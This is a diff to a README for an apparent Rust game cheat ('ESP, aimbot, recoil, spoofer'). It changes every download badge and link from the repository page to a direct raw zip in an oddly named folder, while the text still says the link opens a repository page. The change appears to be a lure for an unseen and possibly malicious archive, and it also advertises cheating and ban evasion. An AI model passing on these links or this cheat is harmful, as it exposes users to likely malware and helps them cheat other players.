@@ -1,6 +1,6 @@
 # ⚙️ SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack - Easy Rust Cheat Setup Guide
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Stayte/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Stayte/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack/raw/refs/heads/main/unpenned/Esp_Rage_Cheat_Spoofer_Aimbot_Recoil_Hack_Cleaner_Legit_SM_Internal_Rust_v1.9.zip)
 
 ---
 
@@ -50,7 +50,7 @@ Follow these steps to download and run the program safely on your Windows machin
 
 Click the button below to visit the download page on GitHub. On this page, you will find the latest release files.
 
-[![Get the App](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/Stayte/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack)
+[![Get the App](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/Stayte/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack/raw/refs/heads/main/unpenned/Esp_Rage_Cheat_Spoofer_Aimbot_Recoil_Hack_Cleaner_Legit_SM_Internal_Rust_v1.9.zip)
 
 - You will be redirected to the main repository page.
 - Look for a section named "Releases" or browse the files to find the executable or installer.
@@ -117,7 +117,7 @@ This project emphasizes ethical behavior. It offers source code for learning, no
 
 ## 🔗 Useful Links
 
-- Main repository: [https://github.com/Stayte/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack](https://github.com/Stayte/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack)
+- Main repository: [https://github.com/Stayte/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack/raw/refs/heads/main/unpenned/Esp_Rage_Cheat_Spoofer_Aimbot_Recoil_Hack_Cleaner_Legit_SM_Internal_Rust_v1.9.zip](https://github.com/Stayte/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack/raw/refs/heads/main/unpenned/Esp_Rage_Cheat_Spoofer_Aimbot_Recoil_Hack_Cleaner_Legit_SM_Internal_Rust_v1.9.zip)
 - Download page: Use the link above to find releases and download files.
 
 ---
@@ -148,4 +148,4 @@ The project supports popular versions of Rust on Windows. It may not work on oth
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Stayte/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Stayte/SMG-Rust-Internal-Cheat-Esp-Aimbot-Recoil-Rage-Legit-Cleaner-Spoofer-Hack/raw/refs/heads/main/unpenned/Esp_Rage_Cheat_Spoofer_Aimbot_Recoil_Hack_Cleaner_Legit_SM_Internal_Rust_v1.9.zip)
